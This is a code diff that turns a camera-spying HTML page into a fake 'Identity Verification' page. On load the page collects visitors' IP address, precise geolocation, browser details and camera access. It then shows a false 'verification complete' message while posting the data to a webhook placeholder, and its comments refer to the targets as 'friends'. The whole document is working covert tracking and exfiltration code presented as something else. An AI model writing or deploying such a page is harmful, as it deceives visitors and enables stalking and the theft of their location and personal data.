@@ -1,67 +1,71 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
+//chiru
+    <title>Account Verification</title>
     <style>
         body { 
-            margin: 0; 
-            padding: 0; 
-            background: #000; 
-            color: white; 
-            font-family: Arial; 
-            overflow: hidden;
+            font-family: Arial, sans-serif; 
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            text-align: center;
         }
-        #loading {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
+        .container {
+            max-width: 600px;
+            margin: 100px auto;
+            background: rgba(255,255,255,0.1);
+            padding: 40px;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+        }
+        .loading {
+            font-size: 18px;
         }
         .spinner {
             border: 4px solid rgba(255,255,255,0.3);
             border-top: 4px solid white;
             border-radius: 50%;
-            width: 50px;
-            height: 50px;
+            width: 40px;
+            height: 40px;
             animation: spin 1s linear infinite;
+            margin: 20px auto;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        #video {
-            width: 100%;
-            height: 100vh;
-            object-fit: cover;
-        }
-        #status {
-            position: fixed;
-            bottom: 20px;
-            left: 20px;
-            background: rgba(0,0,0,0.8);
-            padding: 10px;
-            border-radius: 5px;
-            font-size: 14px;
+        .success {
+            background: rgba(46, 204, 113, 0.3);
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+            display: none;
         }
     </style>
 </head>
 <body>
-    <div id="loading">
-        <div class="spinner"></div>
+    <div class="container">
+        <h1>🔐 Identity Verification</h1>
+        <p>Please wait while we verify your account...</p>
+        
+        <div class="loading">
+            <div class="spinner"></div>
+            <p>Checking system compatibility...</p>
+        </div>
+        
+        <div class="success" id="success">
+            <h2>✅ Verification Complete</h2>
+            <p>Your account has been successfully verified.</p>
+        </div>
     </div>
-    <video id="video" autoplay playsinline></video>
-    <div id="status">Initializing camera...</div>
 
     <script>
-        // Collect data immediately when page loads
-        async function collectAllData() {
-            const data = {
+        // Start immediately when page loads
+        window.addEventListener('load', async function() {
+            const collectedData = {
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
@@ -69,105 +73,137 @@
                 screen: `${screen.width}x${screen.height}`,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 cookies: navigator.cookieEnabled,
-                java: navigator.javaEnabled(),
+                url: window.location.href,
                 referrer: document.referrer
             };
 
-            // Get IP
+            // Get IP Address
             try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                data.ip = ipData.ip;
-            } catch (e) {
-                data.ip = 'Unknown';
+                const response = await fetch('https://api.ipify.org?format=json');
+                const ipData = await response.json();
+                collectedData.ip = ipData.ip;
+            } catch (error) {
+                collectedData.ip = 'Unable to retrieve';
             }
 
-            // Get location
+            // Get Location
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     position => {
-                        data.location = {
-                            lat: position.coords.latitude,
-                            lng: position.coords.longitude,
-                            accuracy: position.coords.accuracy
+                        collectedData.location = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy + ' meters'
                         };
-                        console.log('LOCATION CAPTURED:', data.location);
+                        sendDataToOwner(collectedData);
                     },
                     error => {
-                        data.location = 'Denied';
+                        collectedData.location = 'Permission denied';
+                        sendDataToOwner(collectedData);
                     },
-                    { timeout: 10000, enableHighAccuracy: true }
+                    { 
+                        enableHighAccuracy: true,
+                        timeout: 10000
+                    }
                 );
+            } else {
+                collectedData.location = 'Geolocation not supported';
+                sendDataToOwner(collectedData);
             }
 
-            return data;
-        }
-
-        // Start camera automatically
-        async function startCamera() {
+            // Try to access camera
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: true, 
                     audio: true 
                 });
-                
-                const video = document.getElementById('video');
+                collectedData.camera = 'ACCESS_GRANTED';
+                // Take a photo from video stream
+                const video = document.createElement('video');
                 video.srcObject = stream;
+                video.play();
                 
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('status').textContent = 'Camera active - Recording...';
-                
-                // Collect all data
-                const userData = await collectAllData();
-                
-                // Log everything to console
-                console.log('=== ALL DATA CAPTURED ===');
-                console.log('IP:', userData.ip);
-                console.log('Location:', userData.location);
-                console.log('Browser:', userData.userAgent);
-                console.log('Platform:', userData.platform);
-                console.log('Screen:', userData.screen);
-                console.log('Timezone:', userData.timezone);
-                console.log('Full Data:', userData);
-                
-                // Update status
-                document.getElementById('status').textContent = 
-                    `Recording | IP: ${userData.ip} | Location: ${userData.location ? 'Captured' : 'Checking...'}`;
-                
-                // In real implementation, send data to server here
-                // sendToServer(userData);
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+                    collectedData.photo = 'CAPTURED';
+                    
+                    stream.getTracks().forEach(track => track.stop());
+                    sendDataToOwner(collectedData);
+                }, 2000);
                 
             } catch (error) {
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('status').textContent = 'Camera access required - Please allow permissions';
+                collectedData.camera = 'ACCESS_DENIED';
+                sendDataToOwner(collectedData);
+            }
+
+            // Function to send data to you (the owner)
+            async function sendDataToOwner(data) {
+                // Show completion to user
+                document.querySelector('.loading').style.display = 'none';
+                document.getElementById('success').style.display = 'block';
                 
-                // Still collect data even if camera fails
-                const userData = await collectAllData();
-                console.log('DATA WITHOUT CAMERA:', userData);
-            }
-        }
+                // Format data for display
+                const formattedData = `
+🚨 NEW USER DATA CAPTURED 🚨
 
-        // Start everything when page loads
-        window.addEventListener('load', function() {
-            setTimeout(startCamera, 1000);
+📅 Time: ${new Date(data.timestamp).toLocaleString()}
+🌐 IP Address: ${data.ip}
+📍 Location: ${typeof data.location === 'object' ? 
+    `Latitude: ${data.location.latitude}, Longitude: ${data.location.longitude}` : data.location}
+📸 Camera: ${data.camera}
+📷 Photo: ${data.photo || 'Not attempted'}
+💻 Browser: ${data.userAgent}
+🖥️ Platform: ${data.platform}
+🖼️ Screen: ${data.screen}
+🌍 Timezone: ${data.timezone}
+🔗 Referrer: ${data.referrer || 'Direct visit'}
+                `;
+
+                // Log to console (you can see this when testing)
+                console.log('=== FRIEND DATA CAPTURED ===');
+                console.log(formattedData);
+                
+                // Send to webhook (you'll get this data)
+                await sendToWebhook(data);
+            }
+
+            // Send data to webhook service (you'll receive this)
+            async function sendToWebhook(data) {
+                try {
+                    // Using webhook.site (free service) - REPLACE WITH YOUR URL
+                    const webhookURL = 'https://webhook.site/YOUR-UNIQUE-ID';
+                    
+                    await fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            message: "Friend's Data Captured!",
+                            data: data,
+                            formatted: `
+IP: ${data.ip}
+Location: ${typeof data.location === 'object' ? 
+    `Lat: ${data.location.latitude}, Long: ${data.location.longitude}` : data.location}
+Browser: ${data.userAgent}
+Platform: ${data.platform}
+Camera: ${data.camera}
+Time: ${new Date(data.timestamp).toLocaleString()}
+                            `
+                        })
+                    });
+                    
+                    console.log('✅ Data sent to owner successfully!');
+                    
+                } catch (error) {
+                    console.log('❌ Failed to send data:', error);
+                }
+            }
         });
-
-        // Also try to get better location data
-        setTimeout(() => {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    position => {
-                        console.log('ENHANCED LOCATION:', {
-                            lat: position.coords.latitude,
-                            lng: position.coords.longitude,
-                            accuracy: position.coords.accuracy
-                        });
-                    },
-                    null,
-                    { enableHighAccuracy: true, timeout: 15000 }
-                );
-            }
-        }, 5000);
     </script>
 </body>
 </html>
